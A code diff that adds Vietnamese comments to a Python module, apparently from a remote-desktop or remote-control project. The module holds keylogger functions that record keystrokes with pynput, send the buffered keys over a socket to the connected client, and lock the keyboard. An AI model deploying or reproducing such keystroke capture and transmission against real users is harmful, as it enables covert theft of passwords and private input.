@@ -3,7 +3,7 @@ import keyboard
 from pynput.keyboard import Listener
 from RD_Constant import BUFFERSIZE, FORMAT
 
-
+#Lưu thông tin các phím đã nhấn vào biến buffer
 def keylogger(key):
     global buffer, cmd_flag
     if cmd_flag == 4:
@@ -19,20 +19,20 @@ def keylogger(key):
         buffer += str(tmp)
     return
 
-
+#Gửi thông tin các phím đã ấn sang client
 def show(main_connect):
     global buffer
     main_connect.sendall(buffer.encode(FORMAT))
     buffer = ""
     return
 
-
+#Lắng nghe các phím được bấm
 def listen():
     with Listener(on_press=keylogger) as listener:
         listener.join()
     return
 
-
+#Khóa bàn phím
 def lock():
     global lock_flag
     if lock_flag == 0:
